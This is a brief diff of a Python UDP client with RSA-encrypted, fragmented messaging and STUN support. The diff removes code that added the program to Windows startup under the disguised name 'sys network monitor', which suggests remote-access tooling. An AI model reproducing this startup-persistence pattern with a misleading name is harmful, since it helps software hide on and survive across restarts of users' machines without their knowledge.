@@ -1,9 +1,8 @@
-import subprocess, rsa, socket, time, random, base64, time, gc, struct, platform
+import subprocess, rsa, socket, time, random, base64, time, gc, struct
 from encryption import encrypt_message
 from decryption import decrypt_message
 from message_fragmentation import fragment_message
 from stun import build_stun_message
-from add_to_startup import add_to_windows_startup
 
 
 my_pub_key = None
@@ -16,11 +15,6 @@ ADDED_TO_STARTUP = False
 IP = "0.0.0.0"
 PORT = 27381
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
-if ADDED_TO_STARTUP == False:
-    if platform.system() == "Windows":
-        if add_to_windows_startup("sys network monitor") == 200:
-            ADDED_TO_STARTUP = True
 
 
 def parse_public_key(text: str) -> rsa.PublicKey:
